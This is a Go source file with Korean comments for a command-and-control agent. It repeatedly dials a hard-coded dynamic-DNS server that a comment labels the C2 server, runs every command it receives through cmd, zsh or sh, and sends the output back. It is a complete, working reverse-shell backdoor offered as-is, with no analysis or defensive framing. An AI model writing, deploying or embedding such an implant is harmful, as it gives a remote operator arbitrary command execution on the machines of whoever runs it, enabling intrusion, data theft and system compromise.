package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// handleAgentConnection 함수는 서버와의 단일 연결을 처리합니다.
// 이 함수는 서버로부터 명령을 읽고 실행한 후 결과를 다시 서버로 보냅니다.
// 연결이 끊어지거나 오류가 발생하면 이 함수는 반환됩니다.
func handleAgentConnection(conn net.Conn) {
	// 함수 종료 시 현재 연결을 닫도록 defer를 설정합니다.
	defer conn.Close()

	reader := bufio.NewReader(conn) // 연결로부터 데이터를 읽기 위한 bufio.Reader를 생성합니다.

	for {
		// 서버로부터 한 줄의 명령을 읽습니다.
		cmdStr, err := reader.ReadString('\n')
		if err != nil {
			// 읽기 오류가 발생하면 (예: 서버 연결 끊김) 함수를 종료합니다.
			fmt.Println("Server disconnected or read error:", err)
			return // 연결이 끊어지면 이 함수를 종료하여 재연결 루프가 다시 시작되도록 합니다.
		}

		// 받은 명령 문자열의 앞뒤 공백을 제거합니다.
		cmdStr = strings.TrimSpace(cmdStr)
		if cmdStr == "" {
			continue // 명령이 비어있으면 다음 루프 반복으로 건너뜁니다.
		}

		var cmd *exec.Cmd // 실행할 명령을 나타내는 exec.Cmd 변수를 선언합니다.

		// 운영체제에 따라 명령 실행을 위한 셸을 선택합니다.
		if isWindows() {
			// Windows의 경우, 명령 실행 전에 코드 페이지를 UTF-8(65001)로 변경합니다.
			// 'chcp 65001 > nul'은 코드 페이지를 변경하고, 그 출력을 숨깁니다.
			// '&&'는 앞 명령이 성공하면 다음 명령을 실행하도록 합니다.
			cmd = exec.Command("cmd", "/C", "chcp 65001 > nul && "+cmdStr)
		} else if isMac() {
			cmd = exec.Command("zsh", "-c", cmdStr) // macOS의 경우 zsh를 사용합니다.
		} else {
			cmd = exec.Command("sh", "-c", cmdStr) // 그 외 Unix-like 시스템의 경우 sh를 사용합니다.
		}

		// 명령을 실행하고 표준 출력과 표준 에러를 모두 캡처합니다.
		output, err := cmd.CombinedOutput()
		if err != nil {
			// 명령 실행에 오류가 발생하면 오류 메시지를 출력에 추가합니다.
			output = append(output, []byte(fmt.Sprintf("\n[error executing command: %v]\n", err))...)
		}

		// 이제 Windows에서도 명령 출력이 UTF-8이므로 별도의 인코딩 변환 로직이 필요 없습니다.

		// 실행 결과를 서버로 보냅니다.
		_, writeErr := fmt.Fprintf(conn, "%s\n", string(output))
		if writeErr != nil {
			fmt.Println("Error writing to server:", writeErr)
			return // 쓰기 오류가 발생하면 함수를 종료하여 재연결 루프가 다시 시작되도록 합니다.
		}
	}
}

// agentMain 함수는 에이전트의 주요 로직을 포함하며, 서버에 지속적으로 연결을 시도합니다.
func agentMain() {
	serverAddress := "gndfr.ddns.net:59001" // C2 서버 주소

	for {
		fmt.Printf("Attempting to connect to server at %s...\n", serverAddress)
		// 서버에 연결을 시도합니다.
		conn, err := net.Dial("tcp", serverAddress)
		if err != nil {
			// 연결에 실패하면 오류 메시지를 출력하고 5초간 대기 후 다시 시도합니다.
			fmt.Println("Unable to connect to server:", err)
			time.Sleep(5 * time.Second) // 5초 대기
			continue                    // 루프의 다음 반복으로 이동하여 다시 연결을 시도합니다.
		}

		fmt.Println("Successfully connected to server.")
		// 연결을 처리하는 함수를 호출합니다. 이 함수가 반환되면 연결이 끊어진 것입니다.
		handleAgentConnection(conn)

		fmt.Println("Connection to server lost. Retrying in 5 seconds...")
		time.Sleep(5 * time.Second) // 연결이 끊어진 후 5초 대기 후 재연결 시도
	}
}

// main 함수는 프로그램의 진입점입니다.
func main() {
	agentMain() // 에이전트의 주요 로직을 실행합니다.
}

// isWindows 함수는 프로그램이 Windows에서 실행 중인지 여부를 반환합니다.
func isWindows() bool {
	return runtime.GOOS == "windows"
}

// isMac 함수는 프로그램이 macOS에서 실행 중인지 여부를 반환합니다.
func isMac() bool {
	return runtime.GOOS == "darwin"
}
